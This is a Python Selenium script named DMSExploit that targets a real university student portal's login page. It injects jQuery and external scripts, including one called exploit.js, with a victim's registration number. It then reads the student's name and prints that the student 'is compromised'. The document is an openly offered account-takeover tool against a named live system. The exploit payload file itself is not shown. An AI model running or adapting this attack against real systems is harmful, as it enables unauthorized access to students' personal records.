#!/usr/bin/python3

import time
import emoji
import argparse
from selenium import webdriver


class DMSExploit:

    def __init__(self, reg_number):
        self.reg_number = reg_number
        self.driver = webdriver.Chrome('/usr/bin/chromedriver')
        self.login_script = str(open('login-script.js', 'r').read()).replace(
            'reg_number', self.reg_number)
        self.load_jQuery = str(open('load-jQuery.js', 'r').read())
        self.otp_send = str(open('login-script.js', 'r').read())
        self.exploit = str(open('exploit.js', 'r').read())

    def open_dms(self):
        self.driver.get('https://dms.jaipur.manipal.edu/Loginform.aspx')
        print('executing login-script')
        self.execute_script_with_jquery(self.load_jQuery, self.login_script)
        print('login-script executed')
        time.sleep(1)
        print('executing otp-send')

        self.execute_script_with_jquery(
            self.load_jQuery, self.otp_send, wait=True)
        print('otp-send executed')
        print('executing exploit :)')
        self.execute_script_with_jquery(
            self.load_jQuery, self.exploit)
        victim = self.driver.find_element_by_id(
            'ContentPlaceHolder1_txtStudentName').get_attribute('value')
        print(emoji.emojize('{} is compromised :thumbs_up:').format(victim))

    def execute_script_with_jquery(self, initial_script, final_script, wait=False):
        self.driver.execute_script(initial_script)
        if wait:
            time.sleep(1)
        self.driver.execute_script(final_script)


# driver = webdriver.Chrome('/usr/bin/chromedriver')

# login_script = open('login-script.js', 'r')
# login_script = str(login_script.read()).replace('reg_number', reg_number)

# load_jQuery = open('load-jQuery.js', 'r')
# load_jQuery = str(load_jQuery.read())

# otp_send = open('otp-send.js', 'r')
# otp_send = str(otp_send.read())
